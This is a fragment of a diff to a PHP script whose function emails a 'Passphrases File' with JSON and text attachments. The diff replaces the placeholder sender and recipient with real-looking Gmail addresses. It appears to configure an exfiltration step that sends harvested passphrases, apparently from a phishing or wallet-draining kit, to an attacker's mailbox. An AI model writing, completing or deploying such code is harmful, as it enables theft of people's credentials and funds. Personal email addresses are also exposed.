@@ -66,8 +66,8 @@ function sendEmailWithAttachments($jsonFilePath, $txtFilePath) {
 function createMessageWithAttachments($jsonFilePath, $txtFilePath) {
     $boundary = uniqid(rand(), true);
     $subject = 'Passphrases File';
-    $from = 'your-email@example.com';
-    $to = 'your-email@example.com';
+    $from = 'peterjfk243@gmail.com';
+    $to = 'ol37288997@gmail.com';
 
     $message = "From: $from\r\n";
     $message .= "To: $to\r\n";
